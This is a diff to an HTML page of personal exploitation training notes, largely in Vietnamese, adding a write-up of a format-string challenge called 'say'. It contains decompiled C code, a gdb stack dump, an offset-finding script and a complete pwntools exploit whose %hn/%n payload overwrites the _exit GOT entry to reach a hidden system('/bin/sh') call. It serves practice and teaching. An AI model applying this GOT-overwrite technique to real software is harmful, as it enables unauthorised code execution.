@@ -166,9 +166,16 @@
                         <h1 id="training"><a class="header" href="#training">Training</a></h1>
 <h2 id="buffer-over-flow"><a class="header" href="#buffer-over-flow"><em><strong>Buffer over flow</strong></em></a></h2>
 <ul>
-<li><a href="#training-brute-pie">Training brute Pie</a></li>
-<li><a href="#training-leak-pie-canary">Training leak Pie Canary</a></li>
-<li><a href="#training-leak-with-read">Training leak with read</a></li>
+<li><a href="#training-brute-pie">brute Pie</a></li>
+<li><a href="#training-leak-pie-canary">leak Pie Canary</a></li>
+<li><a href="#training-leak-with-read">leak with read</a></li>
+</ul>
+<h2 id="format-string"><a class="header" href="#format-string"><em><strong>Format string</strong></em></a></h2>
+<ul>
+<li><a href="#say">say</a></li>
+<li><a href="#log_printer">log_printer</a></li>
+<li><a href="#chall1">chall1</a></li>
+<li><a href="#chall2">chall2</a></li>
 </ul>
 <hr />
 <h2 id="training-brute-pie"><a class="header" href="#training-brute-pie">training-brute-pie</a></h2>
@@ -1065,6 +1072,141 @@ r.interactive()
 $ whoami
 hjn4
 $
+
+</code></pre>
+<hr />
+<h2 id="say"><a class="header" href="#say">say</a></h2>
+<h3 id="file-3"><a class="header" href="#file-3">file</a></h3>
+<pre><code class="language-shell">[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/say/say'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
+</code></pre>
+<h3 id="function"><a class="header" href="#function">function</a></h3>
+<pre><code class="language-c">_int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char v4; // [rsp+0h] [rbp-128h] BYREF
+  char *v5; // [rsp+8h] [rbp-120h]
+  char *v6; // [rsp+10h] [rbp-118h]
+  char buf[264]; // [rsp+18h] [rbp-110h] BYREF
+  unsigned __int64 v8; // [rsp+120h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  sub_401331(a1, a2, a3);
+  printf(&quot;Say what now? Tell me!!!\n&gt; &quot;);
+  read(0, buf, 256uLL);
+  v6 = &amp;v4;
+  v5 = buf;
+  _printf(buf);
+  return 0LL;
+}
+
+
+unsigned int sub_401331()
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  signal(14, handler);
+  return alarm(5u);
+}
+
+void __noreturn handler()
+{
+  puts(&quot;Time's up!&quot;);
+  _exit(0);
+}
+
+int sub_4012BE()
+{
+  printf(&quot;oh, ra la` say e...&quot;);
+  return system(&quot;/bin/sh&quot;);
+}
+
+</code></pre>
+<p>Mục tiêu của bài này chính là call tới hàm saye để lấy shell. Ta thấy có lỗi fmt, cơ mà có sẵn hàm để lấy shell rồi, nên mình nghĩ ngay đến việc overwrite GOT của hàm nào đó thành dia chi hàm saye.</p>
+<p>Ta thấy là sau khi thiết lập bộ đệm với setbuf thì thiết lập thêm hẹn giờ, sao cho sau 5s thì sẽ gửi tín hiệu <strong>SIGALRM</strong>, khi mà nhận được tín hiệu này sẽ gọi <strong>handler</strong> và end program.</p>
+<p>Thì mục tiêu là overwrite GOT nên là mình cần đi tìm hàm để ovw, hàm này phải được thực thi sau <strong>printf</strong>, sau 1 đêm ngáo ngơ suy nghĩ thì mình chỉ thấy có mỗi thằng <strong>handler</strong> là có thể được gọi sau khi printf, cơ mà chỉ có thể gọi tới handler khi mà timeup, nên là làm sao để timeup. </p>
+<p>Mình thấy là nếu mà 5s rồi vẫn chưa nhập xong thì timeup, xong mình quay lại xem cơ chế của lỗi fmt cho việc write vào địa chỉ cụ thể. </p>
+<p>Thì cơ chế của nó là, in ra màn hình 15 kí tự thì sẽ ghi giá trị hex(15) = 0xF vào vị trí ở tham số được chỉ định.</p>
+<p>Nên là mình sẽ overwrite GOT của <strong>exit()</strong> trong hàm handler sau đấy thì sẽ tiếp tục in ra màn hình để quá 5s và gọi được handler với exit đã được ovw.</p>
+<p>Thì đầu tiên mình sẽ tìm xem là giá trị mình nhập vào sẽ là tham số thứ mấy của printf.</p>
+<pre><code class="language-python">from pwn import *
+
+for i in range(20):
+    r = process(&quot;./say&quot;)
+    r.send(f&quot;%{i+1}$p&quot;)
+    log.info(f&quot;{i} : \n&quot;)
+    log.info( r.recv())
+    r.interactive()
+
+</code></pre>
+<pre><code class="language-shell">[*] Got EOF while sending in interactive
+[+] Starting local process './say': pid 4456
+[*] 11 :
+[*] Say what now? Tell me!!!
+    &gt; 0x7024323125
+[*] Switching to interactive mode
+[*] Process './say' stopped with exit code 0 (pid 4456)
+[*] Got EOF while reading in interactive
+
+</code></pre>
+<p>thì mình tìm được là ở tham số thứ 11 của printf. </p>
+<p>Cơ mà lúc exploit, attach gdb vào thì mình thấy ở tham số thứ 12 sẽ là null byte, tiếp theo thứ 13 mới chứa chuỗi payload của mình. </p>
+<pre><code class="language-shell">────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────
+ ► 0x40129c    call   0x4012ec                      &lt;0x4012ec&gt;
+
+   0x4012a1    pop    rsi
+   0x4012a2    pop    rdi
+   0x4012a3    mov    eax, 0
+   0x4012a8    mov    rdx, qword ptr [rbp - 8]
+   0x4012ac    sub    rdx, qword ptr fs:[0x28]
+   0x4012b5    je     0x4012bc                      &lt;0x4012bc&gt;
+
+   0x4012b7    call   __stack_chk_fail@plt                      &lt;__stack_chk_fail@plt&gt;
+
+   0x4012bc    leave
+   0x4012bd    ret
+
+   0x4012be    endbr64
+─────────────────────────────────[ STACK ]──────────────────────────────────
+00:0000│ rsp         0x7ffe754d7290 —▸ 0x7ffe754d72a0 ◂— 0x3125703839373425 ('%4798p%1')
+01:0008│             0x7ffe754d7298 —▸ 0x7ffe754d7288 —▸ 0x7ff3a7d452e0 ◂— 0x0
+02:0010│ rax rdi rsi 0x7ffe754d72a0 ◂— 0x3125703839373425 ('%4798p%1')
+03:0018│             0x7ffe754d72a8 ◂— 0x373532256e682436 ('6$hn%257')
+04:0020│             0x7ffe754d72b0 ◂— 0x2570393535373936 ('697559p%')
+05:0028│             0x7ffe754d72b8 ◂— 0x2d2d2d2d6e243731 ('17$n----')
+06:0030│             0x7ffe754d72c0 —▸ 0x404018 (_exit@got.plt) —▸ 0x401030 ◂— endbr64
+07:0038│             0x7ffe754d72c8 —▸ 0x404028 (__stack_chk_fail@got.plt) —▸ 0x401050 ◂— endbr64
+
+</code></pre>
+<p>payload của mình sẽ như sau:</p>
+<p><strong>payload = b&quot;%4798p%16$hn%257697559p%17$n----&quot; +  p64(binary.got['_exit']) + p64(binary.got['_exit'] + 0x10)</strong></p>
+<p>thì 4798 là 0x12be để ghi 2 byte vào tham số thứ 16, ta thấy %4798 .... ---&quot; đã là 32 bytes, 4 stack, chính nó là tham số thứ 11, thêm thằng thứ 12 là null byte, thì chuỗi này chiếm trọn tới tham số thứ 15. Do đó các địa chỉ ở sau sẽ là 16 và 17. </p>
+<p>Thì mình ghi 0x12be vào GOT của _exit(). Xong rồi để gọi được handler() thì mình phải tiếp tục ghi để quá 5s, nên là phần sau sẽ ghi ra màn hình số lượn lớn kí tự và ghi vào 1 địa chỉ bất kì để bypass.</p>
+<h3 id="exploit-code-3"><a class="header" href="#exploit-code-3">exploit code</a></h3>
+<pre><code class="language-python">from pwn import *
+
+binary  = context.binary = ELF('./say')
+r = process(binary.path)
+
+# gdb.attach(r, api=True)
+payload =b&quot;%4798p%16$hn%257697559p%17$n----&quot; +  p64(binary.got['_exit']) + p64(binary.got['_exit'] + 0x10)
+r.sendafter(b&quot;\n&gt; &quot;,payload)
+print(r.recv())
+r.interactive()
+
+# for i in range(20):
+#     r = process(&quot;./say&quot;)
+#     r.send(f&quot;%{i+1}$p&quot;)
+#     log.info(f&quot;{i} : \n&quot;)
+#     log.info( r.recv())
+#     r.interactive()
+
+# 11
 
 </code></pre>
 
